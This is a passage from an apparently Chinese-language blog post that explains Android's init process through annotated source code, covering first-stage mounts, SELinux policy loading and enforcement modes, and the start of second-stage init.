class="string">&quot;sysfs&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>));</span><br><span class="line">    CHECKCALL(mount(<span class="string">&quot;selinuxfs&quot;</span>, <span class="string">&quot;/sys/fs/selinux&quot;</span>, <span class="string">&quot;selinuxfs&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>));</span><br><span class="line"> </span><br><span class="line">    CHECKCALL(mknod(<span class="string">&quot;/dev/kmsg&quot;</span>, S_IFCHR | <span class="number">0600</span>, makedev(<span class="number">1</span>, <span class="number">11</span>)));</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="title function_">constexpr</span> <span class="params">(WORLD_WRITABLE_KMSG)</span> &#123;</span><br><span class="line">        CHECKCALL(mknod(<span class="string">&quot;/dev/kmsg_debug&quot;</span>, S_IFCHR | <span class="number">0622</span>, makedev(<span class="number">1</span>, <span class="number">11</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    CHECKCALL(mknod(<span class="string">&quot;/dev/random&quot;</span>, S_IFCHR | <span class="number">0666</span>, makedev(<span class="number">1</span>, <span class="number">8</span>)));</span><br><span class="line">    CHECKCALL(mknod(<span class="string">&quot;/dev/urandom&quot;</span>, S_IFCHR | <span class="number">0666</span>, makedev(<span class="number">1</span>, <span class="number">9</span>)));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//这对于日志包装器是必需的，它在ueventd运行之前被调用</span></span><br><span class="line">    CHECKCALL(mknod(<span class="string">&quot;/dev/ptmx&quot;</span>, S_IFCHR | <span class="number">0666</span>, makedev(<span class="number">5</span>, <span class="number">2</span>)));</span><br><span class="line">    CHECKCALL(mknod(<span class="string">&quot;/dev/null&quot;</span>, S_IFCHR | <span class="number">0666</span>, makedev(<span class="number">1</span>, <span class="number">3</span>)));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//在第一阶段挂在tmpfs、mnt/vendor、mount/product分区。其他的分区不需要在第一阶段加载，</span></span><br><span class="line">    <span class="comment">//只需要在第二阶段通过rc文件解析来加载</span></span><br><span class="line">    CHECKCALL(mount(<span class="string">&quot;tmpfs&quot;</span>, <span class="string">&quot;/mnt&quot;</span>, <span class="string">&quot;tmpfs&quot;</span>, MS_NOEXEC | MS_NOSUID | MS_NODEV,</span><br><span class="line">        <span class="string">&quot;mode=0755,uid=0,gid=1000&quot;</span>));</span><br><span class="line">    <span class="comment">//创建可供读写的vendor目录</span></span><br><span class="line">    CHECKCALL(mkdir(<span class="string">&quot;/mnt/vendor&quot;</span>, <span class="number">0755</span>));</span><br><span class="line"> </span><br><span class="line">    CHECKCALL(mkdir(<span class="string">&quot;/mnt/product&quot;</span>, <span class="number">0755</span>));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 挂载APEX，这在Android 10.0中特殊引入，用来解决碎片化问题，类似一种组件方式，对Treble的增强，</span></span><br><span class="line">    <span class="comment">// 不写谷歌特殊更新不需要完整升级整个系统版本，只需要像升级APK一样，进行APEX组件升级</span></span><br><span class="line">    CHECKCALL(mount(<span class="string">&quot;tmpfs&quot;</span>, <span class="string">&quot;/debug_ramdisk&quot;</span>, <span class="string">&quot;tmpfs&quot;</span>, MS_NOEXEC | MS_NOSUID | MS_NODEV,</span><br><span class="line">        <span class="string">&quot;mode=0755,uid=0,gid=0&quot;</span>));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// /second_stage_resources is used to preserve files from first to second</span></span><br><span class="line">    <span class="comment">// stage init</span></span><br><span class="line">    CHECKCALL(mount(<span class="string">&quot;tmpfs&quot;</span>, kSecondStageRes, <span class="string">&quot;tmpfs&quot;</span>, MS_NOEXEC | MS_NOSUID | MS_NODEV,</span><br><span class="line">    <span class="string">&quot;mode=0755,uid=0,gid=0&quot;</span>))</span><br><span class="line">    <span class="meta">#<span class="keyword">undef</span> CHECKCALL</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">//把标准输入、标准输出和标准错误重定向到空设备文件“/dev/null”</span></span><br><span class="line">    SetStdioToDevNull(argv);</span><br><span class="line">    <span class="comment">// Now that tmpfs is mounted on /dev and we have /dev/kmsg, we can actually</span></span><br><span class="line"><span class="comment">// talk to the outside world...</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> MTK_LOG</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MTK_LOG_DISABLERATELIMIT</span></span><br><span class="line"><span class="keyword">if</span> (cmdline.find(<span class="string">&quot;init.mtklogdrl=1&quot;</span>) != <span class="built_in">std</span>::<span class="built_in">string</span>::npos)</span><br><span class="line">SetMTKLOGDISABLERATELIMIT();</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">SetMTKLOGDISABLERATELIMIT();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// MTK_LOG_DISABLERATELIMIT</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (GetMTKLOGDISABLERATELIMIT())</span><br><span class="line">InitKernelLogging_split(argv);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">InitKernelLogging(argv);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="comment">//在/dev目录下挂载好tmpfs以及kmsg</span></span><br><span class="line"><span class="comment">//这样就可以初始化/kernel Log系统，供用户打印log</span></span><br><span class="line">InitKernelLogging(argv);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">......</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">初始化一些必须的分区</span></span><br><span class="line"><span class="comment">主要作用是去解析/proc/device-tree/firmware/android/fstab</span></span><br><span class="line"><span class="comment">然后得到“/system”，“/vendor”，“/odm”三个目录的挂载信息</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">if</span> (!DoFirstStageMount(!created_devices)) &#123;</span><br><span class="line">LOG(FATAL) &lt;&lt; <span class="string">&quot;Failed to mount required partitions early ...&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">new_root_info</span>;</span></span><br><span class="line"><span class="keyword">if</span> (stat(<span class="string">&quot;/&quot;</span>, &amp;new_root_info) != <span class="number">0</span>) &#123;</span><br><span class="line">PLOG(ERROR) &lt;&lt; <span class="string">&quot;Could not stat(\&quot;/\&quot;), not freeing ramdisk&quot;</span>;</span><br><span class="line">old_root_dir.reset();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (old_root_dir &amp;&amp; old_root_info.st_dev != new_root_info.st_dev) &#123;</span><br><span class="line">FreeRamdisk(old_root_dir.get(), old_root_info.st_dev);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">SetInitAvbVersionInRecovery();</span><br><span class="line"> </span><br><span class="line">setenv(kEnvFirstStageStartedAt, <span class="built_in">std</span>::to_string(start_time.time_since_epoch().count()).c_str(),</span><br><span class="line"><span class="number">1</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//启动init进程，传入参数selinux_steup</span></span><br><span class="line"><span class="comment">//执行命令：/system/bin/init selinux_setup</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* path = <span class="string">&quot;/system/bin/init&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* args[] = &#123;path, <span class="string">&quot;selinux_setup&quot;</span>, nullptr&#125;;</span><br><span class="line"><span class="keyword">auto</span> fd = open(<span class="string">&quot;/dev/kmsg&quot;</span>, O_WRONLY | O_CLOEXEC);</span><br><span class="line">dup2(fd, STDOUT_FILENO);</span><br><span class="line">dup2(fd, STDERR_FILENO);</span><br><span class="line">close(fd);</span><br><span class="line">execv(path, const_cast&lt;<span class="type">char</span>**&gt;(args));</span><br><span class="line"> </span><br><span class="line"><span class="comment">// execv() only returns if an error happened, in which case we</span></span><br><span class="line"><span class="comment">// panic and never fall through this conditional.</span></span><br><span class="line">PLOG(FATAL) &lt;&lt; <span class="string">&quot;execv(\&quot;&quot;</span> &lt;&lt; path &lt;&lt; <span class="string">&quot;\&quot;) failed&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="加载SELinux规则"><a href="#加载SELinux规则" class="headerlink" title="加载SELinux规则"></a>加载SELinux规则</h3><p>SELinux是「Security-Enhanced Linux」的简称，是美国国家安全局「NSA=The National Security Agency」<br>和SCC（Secure Computing Corporation）开发的 Linux的一个扩张强制访问控制安全模块。在这种访问控制体系的限制下，进程只能访问那些在他的任务中所需要文件。<br>SElinux有两种工作模式：</p><ol><li>permissive，所有的操作都被允许（即没有MAC），但是如果违法权限的话，会记录日志，一般eng模式用</li><li>enforcing，所有操作都会进行权限检查，一般user和user-debug模式用</li></ol><p>不管是security_setenforce还是security_getenforce都是去操作/sys/fs/selinux/enforce文件，<strong>0表示permissive 1表示enforcing</strong><br>SetupSelinux：初始化selinux，加载SElinux规则，配置SWLinux相关log输出，并启动第二阶段<br><strong>system/core/init/selinux.cpp</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*此函数初始化selinux，然后执行init以在init selinux中运行*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">SetupSelinux</span><span class="params">(<span class="type">char</span>** argv)</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> JOURNEY_FEATURE_ROOT_MODE</span></span><br><span class="line">    initJourneyRootMode();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    SetStdioToDevNull(argv);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> MTK_LOG</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MTK_LOG_DISABLERATELIMIT</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span> cmdline;</span><br><span class="line">        android::base::ReadFileToString(<span class="string">&quot;/proc/cmdline&quot;</span>, &amp;cmdline);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (cmdline.find(<span class="string">&quot;init.mtklogdebuggable=1&quot;</span>) != <span class="built_in">std</span>::<span class="built_in">string</span>::npos)</span><br><span class="line">            SetMTKLOGDISABLERATELIMIT();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    SetMTKLOGDISABLERATELIMIT();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// MTK_LOG_DISABLERATELIMIT</span></span></span><br><span class="line">    <span class="keyword">if</span> (GetMTKLOGDISABLERATELIMIT())</span><br><span class="line">        InitKernelLogging_split(argv);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        InitKernelLogging(argv);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="comment">//初始化Kernel日志</span></span><br><span class="line">    InitKernelLogging(argv);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">//Debug版本init crash时重启引导加载程序</span></span><br><span class="line">    <span class="keyword">if</span> (REBOOT_BOOTLOADER_ON_PANIC) &#123;</span><br><span class="line">        InstallRebootSignalHandlers();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    boot_clock::time_point start_time = boot_clock::now();</span><br><span class="line"> </span><br><span class="line">    MountMissingSystemPartitions();</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> MTK_LOG</span></span><br><span class="line">    <span class="keyword">if</span> (GetMTKLOGDISABLERATELIMIT())</span><br><span class="line">        SelinuxSetupKernelLogging_split();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        SelinuxSetupKernelLogging();</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="comment">//注册回调，用来设置需要写入kmsg的selinux日志</span></span><br><span class="line">    SelinuxSetupKernelLogging();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">    LOG(INFO) &lt;&lt; <span class="string">&quot;Opening SELinux policy&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Read the policy before potentially killing snapuserd.</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> policy;</span><br><span class="line">    ReadPolicy(&amp;policy);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">auto</span> snapuserd_helper = SnapuserdSelinuxHelper::CreateIfNeeded();</span><br><span class="line">    <span class="keyword">if</span> (snapuserd_helper) &#123;</span><br><span class="line">        <span class="comment">// Kill the old snapused to avoid audit messages. After this we cannot</span></span><br><span class="line">        <span class="comment">// read from /system (or other dynamic partitions) until we call</span></span><br><span class="line">        <span class="comment">// FinishTransition().</span></span><br><span class="line">        snapuserd_helper-&gt;StartTransition();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    LoadSelinuxPolicy(policy);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (snapuserd_helper) &#123;</span><br><span class="line">        <span class="comment">// Before enforcing, finish the pending snapuserd transition.</span></span><br><span class="line">        snapuserd_helper-&gt;FinishTransition();</span><br><span class="line">        snapuserd_helper = nullptr;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//加载SElinux规则</span></span><br><span class="line">    SelinuxSetEnforcement();</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// We&#x27;re in the kernel domain and want to transition to the init domain.  File systems that</span></span><br><span class="line">    <span class="comment">// store SELabels in their xattrs, such as ext4 do not need an explicit restorecon here,</span></span><br><span class="line">    <span class="comment">// but other file systems do.  In particular, this is needed for ramdisks such as the</span></span><br><span class="line">    <span class="comment">// recovery image for A/B devices.</span></span><br><span class="line">    <span class="keyword">if</span> (selinux_android_restorecon(<span class="string">&quot;/system/bin/init&quot;</span>, <span class="number">0</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        PLOG(FATAL) &lt;&lt; <span class="string">&quot;restorecon failed of /system/bin/init failed&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    setenv(kEnvSelinuxStartedAt, <span class="built_in">std</span>::to_string(start_time.time_since_epoch().count()).c_str(), <span class="number">1</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//准备启动init进程，传入参数second_stage，进入到第二阶段</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* path = <span class="string">&quot;/system/bin/init&quot;</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* args[] = &#123;path, <span class="string">&quot;second_stage&quot;</span>, nullptr&#125;;</span><br><span class="line">    execv(path, const_cast&lt;<span class="type">char</span>**&gt;(args));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// execv() only returns if an error happened, in which case we</span></span><br><span class="line">    <span class="comment">// panic and never return from this function.</span></span><br><span class="line">    PLOG(FATAL) &lt;&lt; <span class="string">&quot;execv(\&quot;&quot;</span> &lt;&lt; path &lt;&lt; <span class="string">&quot;\&quot;) failed&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SelinuxSetEnforcement()：加载SeLinux规则<br><strong>system/core/init/selinux.cpp</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">SelinuxSetEnforcement</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//获取当前Kernel的工作模式</span></span><br><span class="line">    <span class="type">bool</span> kernel_enforcing = (security_getenforce() == <span class="number">1</span>);</span><br><span class="line">    <span class="comment">//获取工作模式的配置</span></span><br><span class="line">    <span class="type">bool</span> is_enforcing = IsEnforcing();</span><br><span class="line">    <span class="comment">//如果当前的工作模式与配置的不同，就将当前的工作模式改掉</span></span><br><span class="line">    <span class="keyword">if</span> (kernel_enforcing != is_enforcing) &#123;</span><br><span class="line">        <span class="keyword">if</span> (security_setenforce(is_enforcing)) &#123;</span><br><span class="line">            PLOG(FATAL) &lt;&lt; <span class="string">&quot;security_setenforce(&quot;</span> &lt;&lt; (is_enforcing ? <span class="string">&quot;true&quot;</span> : <span class="string">&quot;false&quot;</span>)</span><br><span class="line">                &lt;&lt; <span class="string">&quot;) failed&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">auto</span> result = WriteFile(<span class="string">&quot;/sys/fs/selinux/checkreqprot&quot;</span>, <span class="string">&quot;0&quot;</span>); !result.ok()) &#123;</span><br><span class="line">        LOG(FATAL) &lt;&lt; <span class="string">&quot;Unable to write to /sys/fs/selinux/checkreqprot: &quot;</span> &lt;&lt; result.error();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="init进程启动第二阶段"><a href="#init进程启动第二阶段" class="headerlink" title="init进程启动第二阶段"></a>init进程启动第二阶段</h3><p>主要负责：</p><ul><li>创建进程会话密钥，并初始化属性系统</li><li>执行SELinux第二阶段，并恢复一些文件安全上下文</li><li>新建epoll，并初始化子进程终止信号处理函数</li><li>设置其他系统属性，并开启属性服务</li><li>解析init.rc等文件，建立rc文件的action、service，启动其他进程</li></ul><p><img src="/images/20240225/20240225001.png"></p><p><strong>system/core/init/init.cpp</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">SecondStageMain</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">    <span class="meta">#<span class="keyword">ifdef</span> JOURNEY_FEATURE_ROOT_MODE</span></span><br><span class="line">    initJourneyRootMode();</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">*init crash时重启引导加载程序</span></span><br><span class="line"><span class="comment">*这个函数主要作用将各种信号量，如SIGABRT,SIGBUS等的行为设置为SA_RESTART,一旦监听到这些信号即执行重启系统</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="keyword">if</span> (REBOOT_BOOTLOADER_ON_PANIC) &#123;</span><br><span class="line">        InstallRebootSignalHandlers();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    boot_clock::time_point start_time = boot_clock::now();</span><br><span class="line"> </span><br><span class="line">    trigger_shutdown = [](<span class="type">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; command) &#123; shutdown_state.TriggerShutdown(command); &#125;;</span><br><span class="line">    <span class="comment">//把标准输入、标准输出和标准错误重定向到空设备文件“/dev/null&quot;</span></span><br><span class="line">    SetStdioToDevNull(argv);</span><br><span class="line">    <span class="meta">#<span class="keyword">ifdef</span> MTK_LOG</span></span><br><span class="line">    <span class="meta">#<span class="keyword">ifndef</span> MTK_LOG_DISABLERATELIMIT</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span> cmdline;</span><br><span class="line">        android::base::ReadFileToString(<span class="string">&quot;/proc/cmdline&quot;</span>, &amp;cmdline);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (cmdline.find(<span class="string">&quot;init.mtklogdrl=1&quot;</span>) != <span class="built_in">std</span>::<span class="built_in">string</span>::npos)</span><br><span class="line">            SetMTKLOGDISABLERATELIMIT();</span><br><span class="line"> </span><br><span class="line">        <span class="type">const</span> <span class="type">char</span>* force_debuggable_env = getenv(<span class="string">&quot;INIT_FORCE_DEBUGGABLE&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (force_debuggable_env &amp;&amp; AvbHandle::IsDeviceUnlocked()) &#123;</span><br><span class="line">            SetMTKLOGDISABLERATELIMIT();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    SetMTKLOGDISABLERATELIMIT();</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span> <span class="comment">// MTK_LOG_DISABLERATELIMIT</span></span></span><br><span 